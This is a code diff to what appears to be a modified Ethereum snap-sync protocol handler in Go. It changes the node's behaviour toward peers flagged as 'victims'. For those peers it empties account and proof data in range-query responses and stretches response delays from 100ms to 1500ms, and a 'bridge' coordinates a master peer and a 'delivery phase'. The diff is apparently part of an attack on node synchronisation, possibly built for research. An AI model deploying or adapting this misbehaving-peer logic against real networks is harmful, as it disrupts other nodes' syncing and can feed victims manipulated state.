@@ -179,11 +179,12 @@ func HandleMessage(backend Backend, peer *Peer) error {
 		log.Info("Got accounts for query", "amount", len(accounts), "peer", peer.Peer.ID().String()[:8])
 		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 			servedAccounts += len(accounts)
-			if dropResponse && !bridge.IsMaster() {
-				log.Info("Dropping response to range query")
-				return nil		// Drop the query if it is the last one and we are the master peer.
-								// Indeed, we want to make sure the master peer misbehaves only when
-								// everything is ready to start the delivery phase.
+			if dropResponse {
+				accounts = nil
+				proofs = nil
+				log.Info("Nullifying response to range query")
+				//log.Info("Dropping response to range query")
+				//return nil
 			}
 		}
 
@@ -327,7 +328,8 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 		last     common.Hash
 	)
 
-	time.Sleep(100*time.Millisecond)
+	time.Sleep(1500*time.Millisecond)
+	
 	lastResponseLocal := true
 	for it.Next() {
 		hash, account := it.Hash(), common.CopyBytes(it.Account())
@@ -356,6 +358,8 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 	if lastResponseLocal && bridge.IsVictim(p.Peer.ID().String()[:8]) {
 		log.Info("Found last query", "root", req.Root, "origin", req.Origin, "limit", req.Bytes, "served_accounts", servedAccounts)
 		dropResponse = bridge.ReceivedLastRangeQuery(req.Origin)
+	} else if bridge.IsVictim(p.Peer.ID().String()[:8]) {
+		dropResponse = false
 	}
 
 
